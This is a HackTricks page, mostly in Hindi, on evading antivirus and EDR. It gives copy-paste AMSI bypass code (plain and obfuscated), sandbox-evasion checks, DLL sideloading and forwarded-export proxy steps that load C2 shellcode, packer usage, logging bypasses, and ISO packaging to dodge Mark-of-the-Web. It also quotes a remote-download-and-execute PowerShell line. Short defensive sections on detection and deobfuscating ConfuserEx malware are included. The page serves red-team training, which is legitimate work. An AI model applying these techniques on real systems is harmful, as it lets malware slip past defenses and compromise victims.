# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज लिखे गए हैं** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करना बंद करवाने के लिए एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): दूसरे AV बनाकर Windows Defender को काम करना बंद करवाने वाला टूल।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs किसी फाइल को मैलिशियस मानने के लिए अलग-अलग तरीके इस्तेमाल करते हैं — static detection, dynamic analysis, और अधिक एडवांस EDRs के लिए behavioural analysis।

### **Static detection**

Static detection उन मालिशियस strings या byte arrays को फ्लैग करके होता है जो किसी binary या script में मिलते हैं, और फाइल से खुद जानकारी निकालकर भी (जैसे file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब यह है कि public tools का इस्तेमाल आपका पता जल्दी लगा सकता है, क्योंकि उन्हें सम्भवतः पहले ही analyse करके malicious के रूप में चिन्हित किया जा चुका होगा। इस तरह की detection से बचने के कुछ तरीके हैं:

- **एन्क्रिप्शन**

अगर आप binary को एन्क्रिप्ट कर देते हैं, तो AV को आपके प्रोग्राम का पता नहीं चलेगा, लेकिन आपको किसी loader की ज़रूरत पड़ेगी जो प्रोग्राम को memory में decrypt करके चलाए।

- **Obfuscation**

कभी-कभी बस आपकी binary या script की कुछ strings बदल देने से AV को पार किया जा सकता है, पर यह निर्भर करता है कि आप क्या obfuscate कर रहे हैं — कभी-कभी यह टाइम-खपत काम हो सकता है।

- **Custom tooling**

अगर आप अपने खुद के tools बनाते हैं तो कोई known bad signatures नहीं होंगे, पर यह बहुत समय और मेहनत मांगता है।

> [!TIP]
> Windows Defender की static detection के खिलाफ चेक करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूलतः फाइल को कई segments में बाँट देता है और फिर Defender को हर segment अलग से scan करने को कहता है — इस तरह यह आपको बता सकता है कि आपकी binary में कौन-सी strings या bytes फ्लैग हो रही हैं।

मैं आपको practical AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) ज़रूर देखने की सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपकी binary को sandbox में चलाकर मालिशियस गतिविधि देखता है (जैसे ब्राउज़र के passwords decrypt करके पढ़ना, LSASS पर minidump लेना, आदि)। यह हिस्सा थोड़ा trickier हो सकता है, लेकिन sandboxes से बचने के लिए आप कुछ चीज़ें कर सकते हैं।

- **Sleep before execution**  
  यह AV के dynamic analysis को bypass करने का अच्छा तरीका हो सकता है, यह निर्भर करता है कि sandbox कैसे implement किया गया है। AVs के पास फाइलों को scan करने के लिए बहुत कम समय होता है ताकि यूज़र का workflow बाधित न हो, इसलिए लंबी sleeps analysis को प्रभावित कर सकती हैं। समस्या यह है कि कई AVs के sandboxes sleep को skip कर सकते हैं, यह implementation पर निर्भर करता है।
- **Checking machine's resources**  
  आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदाहरण के लिए < 2GB RAM), वरना वे यूज़र की मशीन को स्लो कर देंगे। आप यहाँ क्रिएटिव भी हो सकते हैं, जैसे CPU का temperature या fan speeds चेक करना — हर चीज़ sandbox में implement नहीं होती।
- **Machine-specific checks**  
  अगर आप किसी यूज़र को टार्गेट करना चाहते हैं जिसकी workstation "contoso.local" domain से जुड़ी है, तो आप computer के domain की जाँच कर सकते हैं और अगर वह match नहीं करता तो अपना प्रोग्राम exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox का computername HAL9TH है, तो आप अपने malware में detonation से पहले कंप्यूटर नाम चेक कर सकते हैं — अगर नाम HAL9TH है तो आप defender के sandbox के अंदर हैं और अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के कुछ और बेहतरीन टिप्स [@mgeeky](https://twitter.com/mariuszbit) से

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev चैनल</p></figcaption></figure>

जैसा कि हमने ऊपर कहा, **public tools** अंततः **detect हो ही जाते हैं**, तो आपको अपने आप से यह सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, **क्या आपको सचमुच mimikatz इस्तेमाल करना ज़रूरी है**? या क्या आप किसी ऐसे प्रोजेक्ट का इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और LSASS भी dump कर दे?

सही जवाब शायद बाद वाला ही होगा। उदाहरण के तौर पर, mimikatz AVs और EDRs द्वारा सबसे ज़्यादा फ्लैग किए जाने वाले टूल्स में से एक है; जबकि यह प्रोजेक्ट खुद बहुत अच्छा है, AVs से बचने के लिहाज़ से इसके साथ काम करना मुश्किल होता है, इसलिए जो आप हासिल करना चाहते हैं उसके लिए alternatives ढूँढिए।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि Defender में **automatic sample submission** बंद हो, और कृपया गंभीरता से **DO NOT UPLOAD TO VIRUSTOTAL** अगर आपका लक्ष्य लम्बे समय में evasion हासिल करना है। अगर आप देखना चाहते हैं कि आपका payload किसी विशेष AV द्वारा detect होता है या नहीं, तो उसे VM पर इंस्टॉल करिए, automatic sample submission बंद करने की कोशिश कीजिए, और वहीं टेस्ट करते रहिए जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जहाँ भी संभव हो, evasion के लिए हमेशा **DLLs का उपयोग प्राथमिकता दें**, मेरे अनुभव में DLL फाइलें आमतौर पर **काफ़ी कम detect** होती हैं और analyze भी कम होती हैं, इसलिए यह detection से बचने के लिए एक सरल ट्रिक है (बशर्ते आपका payload किसी तरीके से DLL के रूप में चल सके)।

जैसा कि इस इमेज में दिखता है, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate दिखा रहा है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ ट्रिक्स दिखाएँगे जो आप DLL फाइल्स के साथ इस्तेमाल कर सकते हैं ताकि आप ज़्यादा stealthy रहें।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का फायदा उठाती है — इसके लिए victim application और malicious payload(s) को एक दूसरे के साथ ही रखें।

आप susceptible programs को DLL Sideloading के लिए [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित PowerShell script का उपयोग करके चेक कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील कार्यक्रमों की सूची और वे किन DLL फ़ाइलों को लोड करने की कोशिश करते हैं, आउटपुट करेगा।

मैं दृढ़ता से सलाह देता/देती हूँ कि आप स्वयं **DLL Hijackable/Sideloadable programs** का अन्वेषण करें; यह तकनीक सही ढंग से की जाए तो काफी stealthy है, लेकिन यदि आप सार्वजनिक रूप से ज्ञात DLL Sideloadable प्रोग्राम्स का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

केवल उस नाम की एक malicious DLL रख देने से जो कोई प्रोग्राम लोड करने की उम्मीद करता है, आपका payload नहीं चलेगा, क्योंकि प्रोग्राम उस DLL में कुछ विशिष्ट फ़ंक्शन्स की अपेक्षा करता है; इस समस्या को हल करने के लिए, हम एक अन्य तकनीक का उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहा जाता है।

**DLL Proxying** प्रोग्राम द्वारा किए गए कॉल्स को proxy (and malicious) DLL से मूल DLL पर फॉरवर्ड करता है, इस प्रकार प्रोग्राम की कार्यक्षमता बनाए रखता है और आपके payload के निष्पादन को संभालने में सक्षम होता है।

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

ये वे कदम हैं जो मैंने उठाए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फ़ाइलें देगा: एक DLL स्रोत कोड टेम्पलेट, और मूल नाम बदलकर रखी गई DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL का [antiscan.me](https://antiscan.me) पर 0/26 Detection rate है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **दृढ़ता से सुझाव देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) देखें DLL Sideloading के बारे में और [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि हमने जो चर्चा की है उसके बारे में और अधिक गहराई से जान सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसे functions को export कर सकते हैं जो वास्तव में "forwarders" होते हैं: कोड की ओर इशारा करने के बजाय, export एंट्री में `TargetDll.TargetFunc` के रूप में एक ASCII string होता है। जब कोई caller उस export को resolve करता है, तो Windows loader:

- यदि `TargetDll` पहले से लोड नहीं है तो इसे लोड करेगा
- और उससे `TargetFunc` को resolve करेगा

समझने के लिए मुख्य व्यवहार:
- यदि `TargetDll` कोई KnownDLL है, तो यह protected KnownDLLs namespace से प्रदान किया जाता है (उदा., ntdll, kernelbase, ole32).
- यदि `TargetDll` KnownDLL नहीं है, तो सामान्य DLL खोज क्रम उपयोग किया जाता है, जिसमें उस मॉड्यूल की डायरेक्टरी शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive सक्षम करता है: एक signed DLL खोजें जो किसी non-KnownDLL module नाम की ओर forwarded function export करता हो, फिर उस signed DLL को उसी डायरेक्टरी में उस attacker-controlled DLL के साथ रखें जिसका नाम forwarded target module के नाम के बिल्कुल समान हो। जब forwarded export invoke किया जाता है, तो loader forward को resolve करके उसी डायरेक्टरी से आपकी DLL load कर लेता है और आपकी DllMain execute होती है।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के माध्यम से सुलझाया जाता है।

PoC (copy-paste):
1) साइन की गई सिस्टम DLL को एक लिखने योग्य फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक दुर्भावनापूर्ण `NCRYPTPROV.dll` रखें। एक न्यूनतम DllMain code execution के लिए पर्याप्त है; DllMain को ट्रिगर करने के लिए आपको forwarded function को लागू करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- जब `KeyIsoSetAuditingInterface` को रिज़ॉल्व किया जा रहा है, तो लोडर forward को `NCRYPTPROV.SetAuditingInterface` की ओर फॉलो करता है
- लोडर फिर `C:\test` से `NCRYPTPROV.dll` को लोड करता है और इसका `DllMain` execute करता है
- यदि `SetAuditingInterface` लागू नहीं है, तो आपको "missing API" error केवल तब मिलेगा जब `DllMain` पहले ही चल चुका होगा

Hunting tips:
- उन forwarded exports पर फोकस करें जहाँ target module KnownDLL नहीं है। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के तहत सूचीबद्ध हैं।
- आप forwarded exports को निम्न उपकरणों से सूचीबद्ध कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवार खोजने के लिए Windows 11 forwarder इन्वेंटरी देखें: https://hexacorn.com/d/apis_fwd.txt

पता लगाने/रक्षा के विचार:
- LOLBins (e.g., rundll32.exe) को मॉनिटर करें जब वे non-system paths से signed DLLs लोड करते हैं, और फिर उसी डायरेक्टरी से उसी base name वाले non-KnownDLLs को लोड किया जाता है
- ऐसे process/module chains पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` user-writable paths के तहत
- कोड इंटीग्रिटी नीतियों को लागू करें (WDAC/AppLocker) और application directories में write+execute को नकारें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपनी shellcode को गुप्त तरीके से लोड और निष्पादित करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion सिर्फ एक बिल्ली और चूहे का खेल है, जो आज काम करता है वो कल डिटेक्ट हो सकता है, इसलिए कभी केवल एक ही टूल पर निर्भर न रहें; अगर संभव हो तो कई evasion तकनीकों को चेन करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware) को रोकने के लिए बनाया गया था। शुरुआत में, AV सिर्फ **files on disk** को स्कैन करने में सक्षम थे, इसलिए अगर आप किसी तरह payloads को **directly in-memory** execute कर लेते, तो AV कुछ नहीं कर सकता था, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus समाधानों को स्क्रिप्ट के व्यवहार को निरीक्षित करने की अनुमति देता है, स्क्रिप्ट सामग्री को एक ऐसे रूप में एक्सपोज़ करके जो अनएन्क्रिप्टेड और अनऑब्फ़सकेटेड दोनों हो।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को प्रीपेन्ड करता है और फिर उस executable का path दिखाता है जिससे स्क्रिप्ट चली — इस केस में powershell.exe

हमने कोई फाइल disk पर नहीं छोड़ी, फिर भी AMSI के कारण in-memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI के माध्यम से चलाया जाता है। यह `Assembly.Load(byte[])` के माध्यम से in-memory execution को भी प्रभावित करता है। इसलिए in-memory execution के लिए पुराने .NET वर्शन (जैसे 4.7.2 या उससे नीचे) का उपयोग करने की सलाह दी जाती है यदि आप AMSI से बचना चाहते हैं।

There are a couple of ways to get around AMSI:

- **Obfuscation**

चूँकि AMSI मुख्यतः static detections पर काम करता है, इसलिए आप जो स्क्रिप्ट लोड करने की कोशिश करते हैं उन्हें बदलना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI के पास scripts को unobfuscating करने की क्षमता है भले ही उनमें कई परतें हों, इसलिए obfuscation बुरा विकल्प हो सकता है यह इस बात पर निर्भर करता है कि कैसे किया गया है। इससे इसे evade करना आसान नहीं रहता। हालाँकि कभी-कभी बस कुछ variable names बदलने भर से काम हो जाता है, इसलिए यह निर्भर करता है कि कितनी चीजें flagged हुई हैं।

- **AMSI Bypass**

चूँकि AMSI को powershell (also cscript.exe, wscript.exe, etc.) process में एक DLL लोड करके implement किया गया है, इसलिए इसे बिना उच्च privileges के भी आसानी से टेम्पर किया जा सकता है। AMSI की इस implementation flaw के कारण researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करने के लिए मजबूर करना (amsiInitFailed) यह नतीजा देगा कि current process के लिए कोई scan initiate नहीं होगा। मूलतः इसे [Matt Graeber](https://twitter.com/mattifestation) ने डिस्क्लोज़ किया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
केवल एक लाइन powershell कोड ने वर्तमान powershell प्रक्रिया के लिए AMSI को अनुपयोगी कर दिया। यह लाइन, ज़ाहिर है, AMSI द्वारा स्वयं फ़्लैग की जा चुकी है, इसलिए इस technique का उपयोग करने के लिए कुछ संशोधन की आवश्यकता है।

यहाँ एक संशोधित AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

यह तकनीक मूल रूप से [@RastaMouse](https://twitter.com/_RastaMouse/) द्वारा खोजी गई थी और इसमें amsi.dll में "AmsiScanBuffer" फ़ंक्शन का पता लगाना शामिल है (जो उपयोगकर्ता द्वारा दिए गए इनपुट को स्कैन करने के लिए जिम्मेदार है) और इसे E_INVALIDARG कोड लौटाने वाले निर्देशों से ओवरराइट कर देना। इस तरह असल स्कैन का परिणाम 0 लौटाएगा, जिसे एक साफ़ परिणाम माना जाता है।

> [!TIP]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

AMSI को bypass करने के लिए powershell के साथ कई अन्य तकनीकें भी हैं; इनके बारे में और जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

यह टूल [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) भी AMSI को bypass करने वाली स्क्रिप्ट जनरेट करता है।

**Remove the detected signature**

आप वर्तमान प्रोसेस की मेमोरी से पहचानी गई AMSI सिग्नेचर को हटाने के लिए **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे टूल का उपयोग कर सकते हैं। यह टूल वर्तमान प्रोसेस की मेमोरी में AMSI सिग्नेचर को स्कैन करके उसे NOP निर्देशों से ओवरराइट कर देता है, जिससे वह प्रभावी रूप से मेमोरी से हट जाता है।

**AV/EDR products that uses AMSI**

AMSI का उपयोग करने वाले AV/EDR products की सूची आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में पा सकते हैं।

**Use Powershell version 2**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी स्क्रिप्ट्स को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप इसे इस तरह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS लॉगिंग

PowerShell logging एक ऐसी सुविधा है जो आपको सिस्टम पर निष्पादित सभी PowerShell कमांड्स को लॉग करने की अनुमति देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन यह उन हमलावरों के लिए भी एक समस्या हो सकती है जो detection से बचना चाहते हैं।

PowerShell logging को बायपास करने के लिए आप निम्न तकनीकों का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे टूल का उपयोग कर सकते हैं।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: UnmanagedPowerShell का उपयोग कर एक defenses-रहित powershell स्पॉन करें: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) (यही वह तरीका है जो `powerpick` from Cobal Strike उपयोग करता है)।

## Obfuscation

> [!TIP]
> कई obfuscation तकनीकें डेटा को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाती है और AVs/EDRs के लिए इसे detect करना आसान हो जाता है। इस पर सावधानी बरतें और संभव हो तो encryption केवल उन कोड सेक्शनों पर लागू करें जो संवेदनशील हों या जिन्हें छिपाना आवश्यक हो।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का विश्लेषण कर रहे हों तो अक्सर कई सुरक्षा परतें मिलती हैं जो decompilers और sandboxes को रोकती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से एक near–original IL बहाल करता है जिसे बाद में dnSpy या ILSpy जैसे टूल्स में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और इसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है ताकि कोई संशोधन binary को crash करवा दे। encrypted metadata tables का पता लगाने, XOR keys recover करने और एक clean assembly फिर से लिखने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) शामिल रहते हैं जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को फीड करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 प्रोफ़ाइल चुनें  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace करता है ताकि decompilation और कठिन हो जाए। इन्हें हटाने के लिए **ProxyCall-Remover** का प्रयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आप opaque wrapper functions (`Class8.smethod_10`, …) की जगह सामान्य .NET APIs जैसे `Convert.FromBase64String` या `AES.Create()` देखेंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़ी Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग के लिए खोजें ताकि वास्तविक payload का पता चल सके। अक्सर malware इसे `<Module>.byte_0` के अंदर TLV-encoded byte array के रूप में स्टोर करता है।

ऊपर दिया गया चैन execution flow को बहाल करता है **बिना** malicious sample को चलाए — यह offline workstation पर काम करते समय उपयोगी है।

> 🛈  ConfuserEx एक custom attribute बनाता है जिसका नाम `ConfusedByAttribute` है जिसे IOC के रूप में उपयोग करके samples को स्वतः triage किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य LLVM compilation suite का एक open-source fork प्रदान करना है जो increased software security प्रदान कर सके through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दर्शाता है कि कैसे `C++11/14` language का उपयोग करके compile time पर obfuscated code generate किया जा सकता है बिना किसी external tool का उपयोग किए और बिना compiler को modify किए.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generate किए गए obfuscated operations की एक layer जोड़ता है जो application को crack करने वाले व्यक्ति के लिए काम थोड़ा मुश्किल बना देगी.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो .exe, .dll, .sys सहित विभिन्न प्रकार के PE files को obfuscate करने में सक्षम है.
- [**metame**](https://github.com/a0rtega/metame): Metame एक simple metamorphic code engine है arbitrary executables के लिए.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है LLVM-supported languages के लिए जो ROP (return-oriented programming) का उपयोग करता है। ROPfuscator प्रोग्राम को assembly code level पर obfuscate करता है, सामान्य instructions को ROP chains में transform करके हमारे सामान्य control flow की धारणा को बाधित कर देता है.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है जो Nim में लिखा गया है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert कर सकता है और फिर उन्हें load कर सकता है

## SmartScreen और MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen एक security mechanism है जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से एक reputation-based approach से काम करता है, जिसका अर्थ है कि अनोखी रूप से डाउनलोड की गई applications SmartScreen को trigger करेंगी, जिससे end user को alert किया जाएगा और file के execute होने से रोका जाएगा (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier होता है और यह इंटरनेट से फाइलें डाउनलोड होने पर उस फाइल के साथ डाउनलोड की गई URL के साथ स्वचालित रूप से बनाया जाता है।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान देने योग्य है कि executables जो एक **trusted** signing certificate से signed हैं **SmartScreen को trigger नहीं करेंगे**।

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

उदाहरण उपयोग:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
